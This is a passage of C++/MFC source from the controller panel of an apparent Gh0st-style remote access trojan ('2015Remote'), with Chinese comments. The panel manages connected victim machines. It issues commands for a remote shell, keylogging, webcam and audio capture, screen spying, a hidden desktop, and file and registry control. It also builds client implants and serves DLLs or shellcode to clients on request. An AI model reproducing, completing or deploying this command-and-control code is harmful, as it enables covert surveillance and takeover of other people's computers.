	EnterCriticalSection(&m_cs);
	if (m_CList_Online.m_hWnd!=NULL)   //（控件也是窗口因此也有句柄）
	{
		CRect rc;
		rc.left = 1;          //列表的左坐标     
		rc.top  = 80;         //列表的上坐标
		rc.right  =  cx-1;    //列表的右坐标
		rc.bottom = cy-160;   //列表的下坐标
		m_CList_Online.MoveWindow(rc);

		for(int i=0;i<g_Column_Count_Online;++i){           //遍历每一个列
			double Temp=g_Column_Data_Online[i].nWidth;     //得到当前列的宽度   138
			Temp/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = Temp;                               //转换为int 类型
			m_CList_Online.SetColumnWidth(i,(lenth));       //设置当前的宽度
		}
	}
	LeaveCriticalSection(&m_cs);

	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left = 1;         //列表的左坐标
		rc.top = cy-156;     //列表的上坐标
		rc.right  = cx-1;    //列表的右坐标
		rc.bottom = cy-20;   //列表的下坐标
		m_CList_Message.MoveWindow(rc);
		for(int i=0;i<g_Column_Count_Message;++i){           //遍历每一个列
			double Temp=g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
			Temp/=g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                        //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth=Temp;                                  //转换为int 类型
			m_CList_Message.SetColumnWidth(i,(lenth));        //设置当前的宽度
		}
	}

	if(m_StatusBar.m_hWnd!=NULL){    //当对话框大小改变时 状态条大小也随之改变
		CRect Rect;
		Rect.top=cy-20;
		Rect.left=0;
		Rect.right=cx;
		Rect.bottom=cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}

	if(m_ToolBar.m_hWnd!=NULL)                  //工具条
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);             //设置工具条大小位置
	}
}


void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
	if (nIDEvent == TIMER_CHECK)
	{
		if (!CheckValid()) 
		{
			KillTimer(nIDEvent);
			CInputDialog dlg(this);
			dlg.Init("输入密码", "输入主控程序的密码:");
			dlg.DoModal();
			if (hashSHA256(dlg.m_str.GetString()) != std::string(skCrypt(MASTER_HASH)))
				return OnMainExit();
			MessageBox("请及时对当前主控程序授权: 在工具菜单中生成口令!", "提示", MB_ICONWARNING);
		}
	}
}


void CMy2015RemoteDlg::OnClose()
{
	// 隐藏窗口而不是关闭
	ShowWindow(SW_HIDE);
	Mprintf("======> Hide\n");
}

void CMy2015RemoteDlg::Release(){
	Mprintf("======> Release\n");
	isClosed = TRUE;
	ShowWindow(SW_HIDE);

	Shell_NotifyIcon(NIM_DELETE, &m_Nid);

	BYTE bToken = CLIENT_EXIT_WITH_SERVER ? COMMAND_BYE : SERVER_EXIT;
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetItemCount();
	for(int Pos = 0; Pos < n; ++Pos) 
	{
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(Pos);
		m_iocpServer->OnClientPreSending(ContextObject, &bToken, sizeof(BYTE));
	}
	LeaveCriticalSection(&m_cs);
	Sleep(500);

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Destroy();
		m_iocpServer = NULL;
	}
	g_2015RemoteDlg = NULL;
	SetEvent(m_hExit);
	CloseHandle(m_hExit);
	m_hExit = NULL;
	Sleep(500);

	timeEndPeriod(1);
}

int CALLBACK CMy2015RemoteDlg::CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort) {
	auto* pSortInfo = reinterpret_cast<std::pair<int, bool>*>(lParamSort);
	int nColumn = pSortInfo->first;
	bool bAscending = pSortInfo->second;

	// 获取列值
	CONTEXT_OBJECT* context1 = (CONTEXT_OBJECT*)lParam1;
	CONTEXT_OBJECT* context2 = (CONTEXT_OBJECT*)lParam2;
	CString s1 = context1->GetClientData(nColumn);
	CString s2 = context2->GetClientData(nColumn);

	int result = s1 > s2 ? 1 : -1;
	return bAscending ? result : -result;
}

void CMy2015RemoteDlg::SortByColumn(int nColumn) {
	static int m_nSortColumn = 0;
	static bool m_bSortAscending = false;
	if (nColumn == m_nSortColumn) {
		// 如果点击的是同一列，切换排序顺序
		m_bSortAscending = !m_bSortAscending;
	}
	else {
		// 否则，切换到新列并设置为升序
		m_nSortColumn = nColumn;
		m_bSortAscending = true;
	}

	// 创建排序信息
	std::pair<int, bool> sortInfo(m_nSortColumn, m_bSortAscending);
	EnterCriticalSection(&m_cs);
	m_CList_Online.SortItems(CompareFunction, reinterpret_cast<LPARAM>(&sortInfo));
	LeaveCriticalSection(&m_cs);
}

void CMy2015RemoteDlg::OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult) {
	LPNMHEADER pNMHeader = reinterpret_cast<LPNMHEADER>(pNMHDR);
	int nColumn = pNMHeader->iItem; // 获取点击的列索引
	SortByColumn(nColumn);          // 调用排序函数
	*pResult = 0;
}


void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	//弹出菜单

	CMenu	Menu;
	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);               //加载菜单资源   资源和类对象关联

	CMenu* SubMenu = Menu.GetSubMenu(0);

	CPoint	Point;
	GetCursorPos(&Point);

	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_UPDATE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[2], &m_bmOnline[2]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_SHARE, MF_BYCOMMAND, &m_bmOnline[3], &m_bmOnline[3]);
	Menu.SetMenuItemBitmaps(ID_MAIN_PROXY, MF_BYCOMMAND, &m_bmOnline[4], &m_bmOnline[4]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_HOSTNOTE, MF_BYCOMMAND, &m_bmOnline[5], &m_bmOnline[5]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_VIRTUAL_DESKTOP, MF_BYCOMMAND, &m_bmOnline[6], &m_bmOnline[6]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_GRAY_DESKTOP, MF_BYCOMMAND, &m_bmOnline[7], &m_bmOnline[7]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_REMOTE_DESKTOP, MF_BYCOMMAND, &m_bmOnline[8], &m_bmOnline[8]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_H264_DESKTOP, MF_BYCOMMAND, &m_bmOnline[9], &m_bmOnline[9]);

	// 创建一个新的子菜单
	CMenu newMenu;
	if (!newMenu.CreatePopupMenu()) {
		AfxMessageBox(_T("创建分配主控的子菜单失败!"));
		return;
	}

	int i = 0;
	for (const auto& s : m_DllList) {
		// 向子菜单中添加菜单项
		newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE + i++, s->Name.c_str());
	}
	if (i == 0){
		newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE, "操作指导");
	}
	// 将子菜单添加到主菜单中
	SubMenu->AppendMenuA(MF_STRING | MF_POPUP, (UINT_PTR)newMenu.Detach(), _T("执行代码"));

	int	iCount = SubMenu->GetMenuItemCount();
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetSelectedCount();
	LeaveCriticalSection(&m_cs);
	if (n == 0)         //如果没有选中
	{
		for (int i = 0; i < iCount; ++i)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}
	}

	// 刷新菜单显示
	DrawMenuBar();
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);

	*pResult = 0;
}


void CMy2015RemoteDlg::OnOnlineMessage()
{
	BYTE bToken = COMMAND_TALK;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

char* ReadFileToMemory(const CString& filePath, ULONGLONG &fileSize) {
	fileSize = 0;
	try {
		// 打开文件（只读模式）
		CFile file(filePath, CFile::modeRead | CFile::typeBinary);

		// 获取文件大小
		fileSize = file.GetLength();

		// 分配内存缓冲区: 头+文件大小+文件内容
		char* buffer = new char[1 + sizeof(ULONGLONG) + static_cast<size_t>(fileSize) + 1];
		if (!buffer) {
			return NULL;
		}
		memcpy(buffer+1, &fileSize, sizeof(ULONGLONG));
		// 读取文件内容到缓冲区
		file.Read(buffer + 1 + sizeof(ULONGLONG), static_cast<UINT>(fileSize));
		buffer[1 + sizeof(ULONGLONG) + fileSize] = '\0'; // 添加字符串结束符

		// 释放内存
		return buffer;
	}
	catch (CFileException* e) {
		// 捕获文件异常
		TCHAR errorMessage[256];
		e->GetErrorMessage(errorMessage, 256);
		e->Delete();
		return NULL;
	}

}

void CMy2015RemoteDlg::OnOnlineUpdate()
{
	if (IDYES != MessageBox(_T("确定升级选定的被控程序吗?\n需受控程序支持方可生效!"), 
		_T("提示"), MB_ICONQUESTION | MB_YESNO))
		return;

	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	strcpy(p + 1, "ServerDll.dll");
	ULONGLONG fileSize = 0;
	char *buffer = ReadFileToMemory(path, fileSize);
	if (buffer) {
		buffer[0] = COMMAND_UPDATE;
		SendSelectedCommand((PBYTE)buffer, 1 + sizeof(ULONGLONG) + fileSize + 1);
		delete[] buffer;
	}
	else {
		AfxMessageBox("读取文件失败: "+ CString(path));
	}
}

void CMy2015RemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码
	if (IDYES != MessageBox(_T("确定删除选定的被控计算机吗?"), _T("提示"), MB_ICONQUESTION | MB_YESNO))
		return;

	BYTE bToken = COMMAND_BYE;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending

	EnterCriticalSection(&m_cs);
	int iCount = m_CList_Online.GetSelectedCount();
	for (int i=0;i<iCount;++i)
	{
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  
		m_CList_Online.DeleteItem(iItem);
		strIP+="断开连接";
		ShowMessage(true,strIP);
	}
	LeaveCriticalSection(&m_cs);
}

VOID CMy2015RemoteDlg::OnOnlineCmdManager()
{
	BYTE	bToken = COMMAND_SHELL;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineProcessManager()
{
	BYTE	bToken = COMMAND_SYSTEM;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}

VOID CMy2015RemoteDlg::OnOnlineWindowManager()
{
	BYTE	bToken = COMMAND_WSLIST;     
	SendSelectedCommand(&bToken, sizeof(BYTE));	
}


VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
{
	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "DXGI");
	CString algo = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ScreenCompress", "");
	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, n, algo.IsEmpty() ? ALGORITHM_DIFF : atoi(algo.GetString())};
	SendSelectedCommand(bToken, sizeof(bToken));
}

VOID CMy2015RemoteDlg::OnOnlineFileManager()
{
	BYTE	bToken = COMMAND_LIST_DRIVE;    
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineAudioManager()
{
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineVideoManager()
{
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineServerManager()
{
	BYTE	bToken = COMMAND_SERVICES;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineRegisterManager()
{
	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

VOID CMy2015RemoteDlg::OnOnlineKeyboardManager()
{
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectedCommand(&bToken, sizeof(BYTE));
}

std::vector<std::string> splitString(const std::string& str, char delimiter) {
	std::vector<std::string> result;
	std::stringstream ss(str);
	std::string item;

	while (std::getline(ss, item, delimiter)) {
		result.push_back(item);
	}
	return result;
}

std::string joinString(const std::vector<std::string>& tokens, char delimiter) {
	std::ostringstream oss;

	for (size_t i = 0; i < tokens.size(); ++i) {
		oss << tokens[i];
		if (i != tokens.size() - 1) {  // 在最后一个元素后不添加分隔符
			oss << delimiter;
		}
	}

	return oss.str();
}


bool CMy2015RemoteDlg::CheckValid() {
	DateVerify verify;
#ifdef _DEBUG
	BOOL isTrail = verify.isTrail(0);
#else
	BOOL isTrail = verify.isTrail(14);
#endif

	if (!isTrail) {
		auto THIS_APP = (CMy2015RemoteApp*)AfxGetApp();
		auto settings = "settings", pwdKey = "Password";
		// 验证口令
		CPasswordDlg dlg;
		static std::string hardwareID = getHardwareID();
		static std::string hashedID = hashSHA256(hardwareID);
		static std::string deviceID = getFixedLengthID(hashedID);
		CString pwd = THIS_APP->m_iniFile.GetStr(settings, pwdKey, "");

		dlg.m_sDeviceID = deviceID.c_str();
		dlg.m_sPassword = pwd;
		if (pwd.IsEmpty() && IDOK != dlg.DoModal() || dlg.m_sPassword.IsEmpty())
			return false;

		// 密码形式：20250209 - 20350209: SHA256
		auto v = splitString(dlg.m_sPassword.GetBuffer(), '-');
		if (v.size() != 6)
		{
			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
			MessageBox("格式错误，请重新申请口令!", "提示", MB_ICONINFORMATION);
			return false;
		}
		std::vector<std::string> subvector(v.begin() + 2, v.end());
		std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash();
		std::string finalKey = deriveKey(password, deviceID);
		std::string hash256 = joinString(subvector, '-');
		std::string fixedKey = getFixedLengthID(finalKey);
		if (hash256 != fixedKey) {
			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
			if (pwd.IsEmpty() || (IDOK != dlg.DoModal() || hash256 != fixedKey)) {
				if (!dlg.m_sPassword.IsEmpty())
					MessageBox("口令错误, 无法继续操作!", "提示", MB_ICONWARNING);
				return false;
			}
		}
		// 判断是否过期
		auto pekingTime = ToPekingTime(nullptr);
		char curDate[9];
		std::strftime(curDate, sizeof(curDate), "%Y%m%d", &pekingTime);
		if (curDate < v[0] || curDate > v[1]) {
			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
			MessageBox("口令过期，请重新申请口令!", "提示", MB_ICONINFORMATION);
			return false;
		}
		if (dlg.m_sPassword != pwd)
			THIS_APP->m_iniFile.SetStr(settings, pwdKey, dlg.m_sPassword);
	}
	return true;
}

void CMy2015RemoteDlg::OnOnlineBuildClient()
{
	// 给新编译的程序14天试用期，过期之后生成服务端需要申请"口令"；
	// 如果要对其他功能乃至整个程序启动授权逻辑，将下述if语句添加到相应地方即可。
	// 口令包含授权日期范围，确保一机一码；授权逻辑会检测计算机日期未被篡改!
	// 注释下面 if 语句可以屏蔽该授权逻辑.
	// 2025/04/20 
	if (!CheckValid())
		return;

	// TODO: 在此添加命令处理程序代码
	CBuildDlg Dlg;
	Dlg.m_strIP = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "localIp", "");
	int Port = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
	Dlg.m_strIP = Dlg.m_strIP.IsEmpty() ? "127.0.0.1" : Dlg.m_strIP;
	Dlg.m_strPort = Port <= 0 ? "6543" : std::to_string(Port).c_str();
	Dlg.DoModal();
}


VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
{
	EnterCriticalSection(&m_cs);
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while(Pos)
	{
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
		if (!ContextObject->bLogin && szBuffer[0] != COMMAND_BYE)
			continue;
		if (szBuffer[0]== COMMAND_WEBCAM && ContextObject->sClientInfo[ONLINELIST_VIDEO] == CString("无"))
		{
			continue;
		}
		// 发送获得驱动器列表数据包
		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);
	} 
	LeaveCriticalSection(&m_cs);
}

//真彩Bar
VOID CMy2015RemoteDlg::OnAbout()
{
	MessageBox("Copyleft (c) FTU 2025" + CString("\n编译日期: ") + __DATE__ + 
		CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "关于");
}

//托盘Menu
void CMy2015RemoteDlg::OnNotifyShow()
{
	BOOL v=	IsWindowVisible();
	ShowWindow(v? SW_HIDE : SW_SHOW);
}


void CMy2015RemoteDlg::OnNotifyExit()
{
	Release();
	CDialogEx::OnOK(); // 关闭对话框
}


//固态菜单
void CMy2015RemoteDlg::OnMainSet()
{
	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
	CSettingDlg  Dlg;

	Dlg.DoModal();   //模态 阻塞
	if (nMaxConnection != Dlg.m_nMax_Connect)
	{
		m_iocpServer->UpdateMaxConnection(Dlg.m_nMax_Connect);
	}
	int m = atoi(((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ReportInterval", "5"));
	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
	if (m== m_settings.ReportInterval && n == m_settings.DetectSoftware) {
		return;
	}

	LVCOLUMN lvColumn;
	memset(&lvColumn, 0, sizeof(LVCOLUMN));
	lvColumn.mask = LVCF_TEXT;
	lvColumn.pszText = Dlg.m_sSoftwareDetect.GetBuffer();
	CLock L(m_cs);
	m_settings.ReportInterval = m;
	m_settings.DetectSoftware = n;
	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
	SendMasterSettings(nullptr);
}


void CMy2015RemoteDlg::OnMainExit()
{
	Release();
	CDialogEx::OnOK(); // 关闭对话框
}

BOOL CMy2015RemoteDlg::ListenPort()
{
	int nPort = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
	//读取ini 文件中的监听端口
	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
	//读取最大连接数
	if (nPort<=0 || nPort>65535)
		nPort = 6543;
	if (nMaxConnection <= 0)
		nMaxConnection = 10000;
	return Activate(nPort,nMaxConnection);             //开始监听
}


std::string exec(const std::string& cmd) {
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
		return "";
	}

	STARTUPINFOA si = {};
	PROCESS_INFORMATION pi = {};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;

	std::string command = "cmd.exe /C " + cmd;

	if (!CreateProcessA(
		NULL,
		(char*)command.data(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		return "";
	}

	CloseHandle(hWritePipe);

	char buffer[256];
	std::string result;
	DWORD bytesRead;

	while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		result += buffer;
	}

	CloseHandle(hReadPipe);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return result;
}

std::vector<std::string> splitByNewline(const std::string& input) {
	std::vector<std::string> lines;
	std::istringstream stream(input);
	std::string line;

	while (std::getline(stream, line)) {
		lines.push_back(line);
	}

	return lines;
}

BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
{
	assert(m_iocpServer);
	UINT ret = 0;
	if ( (ret=m_iocpServer->StartServer(NotifyProc, OfflineProc, nPort)) !=0 )
	{
		Mprintf("======> StartServer Failed \n");
		char cmd[200];
		sprintf_s(cmd, "for /f \"tokens=5\" %%i in ('netstat -ano ^| findstr \":%d \"') do @echo %%i", nPort);
		std::string output = exec(cmd);
		output.erase(std::remove(output.begin(), output.end(), '\r'), output.end());
		if (!output.empty())
		{
			std::vector<std::string> lines = splitByNewline(output);
			std::sort(lines.begin(), lines.end());
			auto last = std::unique(lines.begin(), lines.end());
			lines.erase(last, lines.end());

			std::string pids;
			for (const auto& line : lines) {
				pids += line + ",";
			}
			if (!pids.empty()) {
				pids.back() = '?';
			}
			if (IDYES == MessageBox("调用函数StartServer失败! 错误代码:" + CString(std::to_string(ret).c_str()) +
				"\r\n是否关闭以下进程重试: " + pids.c_str(), "提示", MB_YESNO)) {
				for (const auto& line : lines) {
					auto cmd = std::string("taskkill /f /pid ") + line;
					exec(cmd.c_str());
				}
				return Activate(nPort, nMaxConnection);
			}
		}else
			MessageBox("调用函数StartServer失败! 错误代码:" + CString(std::to_string(ret).c_str()));
		return FALSE;
	}

	CString strTemp;
	strTemp.Format("监听端口: %d成功", nPort);
	ShowMessage(true,strTemp);
	return TRUE;
}


VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
	if (!g_2015RemoteDlg)
		return;

	AUTO_TICK(50);

	switch (ContextObject->v1)
	{
	case VIDEO_DLG:
	{
		CVideoDlg* Dlg = (CVideoDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case SERVICES_DLG:
	{
		CServicesDlg* Dlg = (CServicesDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case AUDIO_DLG:
	{
		CAudioDlg* Dlg = (CAudioDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case SYSTEM_DLG:
	{
		CSystemDlg* Dlg = (CSystemDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case SHELL_DLG:
	{
		CShellDlg* Dlg = (CShellDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case SCREENSPY_DLG:
	{
		CScreenSpyDlg* Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case FILEMANAGER_DLG:
	{
		CFileManagerDlg* Dlg = (CFileManagerDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case REGISTER_DLG:
	{
		CRegisterDlg* Dlg = (CRegisterDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case KEYBOARD_DLG:
	{
		CKeyBoardDlg* Dlg = (CKeyBoardDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case PROXY_DLG: {
		CProxyMapDlg* Dlg = (CProxyMapDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case HIDESCREEN_DLG: {
		CHideScreenSpyDlg* Dlg = (CHideScreenSpyDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case MACHINE_DLG: {
		CMachineDlg* Dlg = (CMachineDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case CHAT_DLG: {
		CChat* Dlg = (CChat*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case DECRYPT_DLG: {
		DecryptDlg* Dlg = (DecryptDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	default: {
		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (hEvent == NULL) {
			Mprintf("===> NotifyProc CreateEvent FAILED: %p <===\n", ContextObject);
			return;
		}
		if (!g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)hEvent, (LPARAM)ContextObject)) {
			Mprintf("===> NotifyProc PostMessage FAILED: %p <===\n", ContextObject);
			CloseHandle(hEvent);
			return;
		}
		HANDLE handles[2] = { hEvent, g_2015RemoteDlg->m_hExit };
		DWORD result = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
	}
	}
}

// 对话框句柄及对话框类型
struct dlgInfo
{
	HANDLE hDlg;
	int v1;
	dlgInfo(HANDLE h, int type) : hDlg(h), v1(type) { }
};

VOID CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
{
	if (!g_2015RemoteDlg)
		return;
	dlgInfo* dlg = ContextObject->v1 > 0 ? new dlgInfo(ContextObject->hDlg, ContextObject->v1) : NULL;

	SOCKET nSocket = ContextObject->sClientSocket;

	g_2015RemoteDlg->PostMessage(WM_USEROFFLINEMSG, (WPARAM)dlg, (LPARAM)nSocket);

	ContextObject->v1 = 0;
}


LRESULT CMy2015RemoteDlg::OnHandleMessage(WPARAM wParam, LPARAM lParam) {
	HANDLE hEvent = (HANDLE)wParam;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	MessageHandle(ContextObject);
	if (hEvent) {
		SetEvent(hEvent);
		CloseHandle(hEvent);
	}
	return S_OK;
}


VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
{
	if (isClosed) {
		return;
	}
	switch (ContextObject->InDeCompressedBuffer.GetBYTE(0))
	{
	case CMD_EXECUTE_DLL: // 请求DLL
	{
		DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
		for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i){
			DllInfo* dll = *i;
			if (dll->Name == info->Name) {
				return m_iocpServer->OnClientPreSending(ContextObject, dll->Data->Buf(), dll->Data->length());
			}
		}
		break;
	}
	case COMMAND_PROXY:
	{
		g_2015RemoteDlg->SendMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_HEARTBEAT: case 137:
		UpdateActiveWindow(ContextObject);
		break;
	case SOCKET_DLLLOADER: {// 请求DLL
		auto len = ContextObject->InDeCompressedBuffer.GetBufferLength();
		bool is64Bit = len > 1 ? ContextObject->InDeCompressedBuffer.GetBYTE(1) : false;
		int typ = (len > 2 ? ContextObject->InDeCompressedBuffer.GetBYTE(2) : MEMORYDLL);
		bool isRelease = len > 3 ? ContextObject->InDeCompressedBuffer.GetBYTE(3) : true;
		int connNum = 0;
		if (typ == SHELLCODE) {
			Mprintf("===> '%s' Request SC [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
		} else {
			Mprintf("===> '%s' Request DLL [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
		}
		char version[12] = {};
		ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
		// TODO 注入记事本的加载器需要更新
		SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
		break;
	}
	case COMMAND_BYE: // 主机下线
		{
			CancelIo((HANDLE)ContextObject->sClientSocket);
			closesocket(ContextObject->sClientSocket); 
			Sleep(10);
			break;
		}
	case TOKEN_BITMAPINFO_HIDE: { // 虚拟桌面
		g_2015RemoteDlg->SendMessage(WM_OPENHIDESCREENDLG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_SYSINFOLIST: { // 主机管理
		g_2015RemoteDlg->SendMessage(WM_OPENMACHINEMGRDLG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_CHAT_START: { // 远程交谈
		g_2015RemoteDlg->SendMessage(WM_OPENCHATDIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_DECRYPT: { // 解密数据
		g_2015RemoteDlg->SendMessage(WM_OPENDECRYPTDIALOG, 0, (LPARAM)ContextObject);
		break;
	}
	case TOKEN_KEYBOARD_START: {// 键盘记录
			g_2015RemoteDlg->SendMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_LOGIN: // 上线包
		{
			g_2015RemoteDlg->SendMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); 
			break;
		}
	case TOKEN_BITMAPINFO: // 远程桌面
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_DRIVE_LIST: // 文件管理
		{
			g_2015RemoteDlg->SendMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_TALK_START: // 发送消息
		{
			g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_SHELL_START: // 远程终端
		{
